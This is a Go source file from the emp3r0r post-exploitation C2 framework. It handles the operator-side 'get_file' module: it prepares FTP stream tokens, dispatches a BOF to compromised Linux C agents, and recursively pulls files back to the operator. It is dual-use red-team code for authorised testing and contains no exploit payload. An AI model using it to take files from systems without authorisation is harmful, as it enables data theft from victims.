package modules

import (
	"fmt"
	"strconv"
	"strings"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/ftp"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
	c2context "github.com/jm33-m0/emp3r0r/core/internal/cc/context"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// Names of the file-transfer modules. They are ordinary manifests whose
// transfer parameters are declared `internal`: the C2 owns those values.
const ModGetFile = "get_file"

// The provider is a variable so tests can substitute it.
var prepareGetFileStream = ftp.PrepareGetFileStream

// prepareModuleParameters fills the parameters that only the C2 can supply for
// operator-driven file transfer, before the invocation is packed. Their
// manifest entries are `internal`, so the console never asks the operator for
// them.
//
// get_file needs the token and the resume offset of the FTP stream that receives
// the agent's upload.
//
// done reports that the request is already satisfied, so no command has to be
// sent.
func prepareModuleParameters(config *def.ModuleConfig, target *def.Emp3r0rAgent, flags map[string]string) (done bool, err error) {
	if config == nil || flags == nil {
		return false, nil
	}

	switch strings.ToLower(config.Name) {
	case ModGetFile:
		path := strings.TrimSpace(flags["path"])
		if path == "" {
			return false, fmt.Errorf("option path is required")
		}
		// A caller that already prepared the stream (the operator `get`
		// command) owns the token and offset; do not register a second stream.
		if flags["stream"] != "" && flags["offset"] != "" {
			return false, nil
		}
		if target == nil {
			return false, fmt.Errorf("no target agent")
		}
		transfer, err := prepareGetFileStream(path, target)
		if err != nil {
			return false, err
		}
		if transfer.Complete {
			logging.Successf("%s is already downloaded", path)
			return true, nil
		}
		flags["stream"] = transfer.Token
		flags["offset"] = strconv.FormatInt(transfer.Offset, 10)
	case ModSocks5:
		// The SOCKS5 listener owns the token: it exists per CONNECT, together
		// with the target the operator's client asked for. A console run has
		// neither, so it is refused instead of asking for a value no operator
		// can know.
		if strings.TrimSpace(flags["token"]) == "" || strings.TrimSpace(flags["target"]) == "" {
			return false, fmt.Errorf("%s is dispatched by socks_start, which supplies the token and target", ModSocks5)
		}
	}

	return false, nil
}

// DownloadGetFile downloads one remote path through the get_file module. The
// operator `get` command calls this instead of the legacy agent `get` command,
// so a C agent performs the transfer with its BOF.
//
// A directory is always listed. With recursive set, every listed file is then
// downloaded through its own module dispatch.
func DownloadGetFile(target *def.Emp3r0rAgent, path, filter string, recursive bool) error {
	if target == nil {
		return fmt.Errorf("no target agent selected")
	}
	path = strings.TrimSpace(path)
	if path == "" {
		return fmt.Errorf("file path is required")
	}
	if !canRunGetFileModule(target) {
		return ftp.DownloadFromAgent(target, path, recursive, filter)
	}

	transfer, err := ftp.PrepareGetFileStream(path, target)
	if err != nil {
		return err
	}
	if transfer.Complete {
		logging.Successf("%s is already downloaded", path)
		return nil
	}

	flags := map[string]string{
		"path":   path,
		"filter": filter,
		"stream": transfer.Token,
		"offset": strconv.FormatInt(transfer.Offset, 10),
	}
	if transfer.Listing {
		return downloadGetFileListing(target, flags, recursive)
	}
	return downloadGetFileTransfer(target, path, flags)
}

// canRunGetFileModule reports whether the target can execute the get_file BOF.
// The module ships an x86-64 object, so other agents keep the legacy `get`
// command path instead of failing on an incompatible object.
func canRunGetFileModule(target *def.Emp3r0rAgent) bool {
	if target == nil || !strings.EqualFold(target.GOOS, "linux") {
		return false
	}
	// Only the C agent installs the BOF host bridge; the Go agent keeps using
	// its built-in get command.
	if !strings.EqualFold(target.AgentImpl, "c") {
		return false
	}
	arch := target.GOArch
	if arch == "" {
		arch = target.Arch
	}
	return normalizeAgentArch(arch) == "amd64"
}

// downloadGetFileListing asks the module for a directory listing and, when
// recursive is set, downloads every path it names.
func downloadGetFileListing(target *def.Emp3r0rAgent, flags map[string]string, recursive bool) error {
	jobID, err := dispatchGetFile(target, flags)
	if err != nil {
		return err
	}
	out, err := live.AwaitCmdResult(jobID, live.AgentReplyTimeout(), func() error { return nil })
	if err != nil {
		return fmt.Errorf("list %s: %w", flags["path"], err)
	}
	// The BOF prints a summary line after the paths; without it the listing
	// failed and the output is the agent's error message.
	if !strings.Contains(out, " file(s) in ") {
		return fmt.Errorf("list %s: %s", flags["path"], strings.TrimSpace(out))
	}
	if !recursive {
		return nil
	}

	files := parseGetFileListing(out)
	if len(files) == 0 {
		logging.Warningf("no files matched in %s", flags["path"])
		return nil
	}
	var failed []string
	for _, file := range files {
		if err := downloadGetFileOne(target, file); err != nil {
			logging.Warningf("Download %s: %v", file, err)
			failed = append(failed, file)
		}
	}
	if len(failed) > 0 {
		return fmt.Errorf("failed to download %d file(s): %s", len(failed), strings.Join(failed, ", "))
	}
	logging.Successf("Downloaded %d file(s) from %s", len(files), flags["path"])
	return nil
}

// downloadGetFileOne prepares and runs one file transfer.
func downloadGetFileOne(target *def.Emp3r0rAgent, path string) error {
	transfer, err := ftp.PrepareGetFileStream(path, target)
	if err != nil {
		return err
	}
	if transfer.Complete {
		logging.Successf("%s is already downloaded", path)
		return nil
	}
	flags := map[string]string{
		"path":   path,
		"filter": "",
		"stream": transfer.Token,
		"offset": strconv.FormatInt(transfer.Offset, 10),
	}
	return downloadGetFileTransfer(target, path, flags)
}

// dispatchGetFile runs the get_file module for prepared flags. The module is a
// custom module, so dispatch is the same path the console uses.
func dispatchGetFile(target *def.Emp3r0rAgent, flags map[string]string) (string, error) {
	// The module runner reads live.ActiveModule; restore whatever the console
	// had selected before the get command, which is not a module command.
	prev := live.ActiveModule
	SetActiveModule(ModGetFile)
	defer func() { live.ActiveModule = prev }()
	if live.ActiveModule == nil {
		return "", fmt.Errorf("module %s is not available", ModGetFile)
	}
	ctx := &c2context.C2Context{Target: target, Flags: flags}
	jobID := moduleCustomWithJob(ctx)
	if jobID == "" {
		return "", fmt.Errorf("dispatching %s", ModGetFile)
	}
	return jobID, nil
}

// downloadGetFileTransfer waits until the operator side has committed the file
// or the agent has reported a failure.
func downloadGetFileTransfer(target *def.Emp3r0rAgent, path string, flags map[string]string) error {
	jobID, err := dispatchGetFile(target, flags)
	if err != nil {
		abortGetFile(path)
		return err
	}
	if err := waitForGetFile(jobID, path); err != nil {
		abortGetFile(path)
		return err
	}
	_, saveToFile, tempname, lock := ftp.GenerateGetFilePaths(path)
	if util.IsFileExist(tempname) || util.IsFileExist(lock) || !util.IsFileExist(saveToFile) {
		// A transfer that never started has no temp file, and FileSize reports
		// -1 for a missing path.
		received := max(util.FileSize(tempname), 0)
		return fmt.Errorf("%s: transfer stopped after %d bytes", path, received)
	}
	logging.Successf("Downloaded %s to %s", path, saveToFile)
	return nil
}

// abortGetFile drops the registration of a transfer that will never complete,
// including its token alias.
func abortGetFile(path string) {
	val, ok := network.FTPStreams.Load(path)
	if !ok {
		return
	}
	if sh, ok := val.(*network.StreamHandler); ok && sh != nil {
		network.FTPStreams.Delete("token:" + sh.Token)
	}
	network.FTPStreams.Delete(path)
}

// waitForGetFile polls the registered FTP stream. The agent runs the BOF only
// on its next poll, so the wait starts at one agent reply timeout and extends
// while bytes are arriving; an agent-side error ends it immediately.
func waitForGetFile(jobID, path string) error {
	_, _, tempname, _ := ftp.GenerateGetFilePaths(path)
	deadline := time.Now().Add(live.AgentReplyTimeout())
	lastSize := int64(-1)
	for {
		if out, ok := live.CmdResultString(jobID); ok && !strings.Contains(out, " sent") {
			live.CmdResults.Delete(jobID)
			return fmt.Errorf("%s: %s", path, strings.TrimSpace(util.SanitizeText(out)))
		}
		if _, ok := network.FTPStreams.Load(path); !ok {
			// The receiver finalizes the destination before it unregisters the
			// stream, so a vanished registration means the transfer is over.
			return nil
		}
		if size := util.FileSize(tempname); size != lastSize {
			lastSize = size
			deadline = time.Now().Add(2 * live.AgentReplyTimeout())
		}
		if time.Now().After(deadline) {
			return fmt.Errorf("%s: agent did not start the transfer after %s", path, live.AgentReplyTimeout())
		}
		util.TakeABlink()
	}
}

// parseGetFileListing extracts file paths from the module's output. The BOF
// prints one path per line and a summary line, which is not a path.
func parseGetFileListing(out string) []string {
	var files []string
	seen := make(map[string]struct{})
	for _, line := range strings.Split(util.SanitizeText(out), "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		if !strings.HasPrefix(line, "/") && !strings.HasPrefix(line, "memfs://") {
			continue
		}
		if _, ok := seen[line]; ok {
			continue
		}
		seen[line] = struct{}{}
		files = append(files, line)
	}
	return files
}
